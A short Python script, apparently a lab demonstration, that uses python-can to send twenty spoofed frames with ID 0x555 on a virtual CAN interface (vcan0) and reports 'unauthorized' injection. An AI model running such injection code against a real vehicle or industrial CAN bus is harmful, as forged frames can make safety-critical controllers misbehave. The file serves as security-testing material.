#!/usr/bin/env python3
import time

import can


def main() -> None:
    bus = can.Bus(channel="vcan0", interface="socketcan")
    spoofed_id = 0x555

    for _ in range(20):
        msg = can.Message(arbitration_id=spoofed_id, data=[0x13, 0x37, 0x00, 0x00], is_extended_id=False)
        bus.send(msg)
        time.sleep(0.1)

    print(f"Spoofing complete: sent unauthorized CAN ID 0x{spoofed_id:X}")


if __name__ == "__main__":
    main()
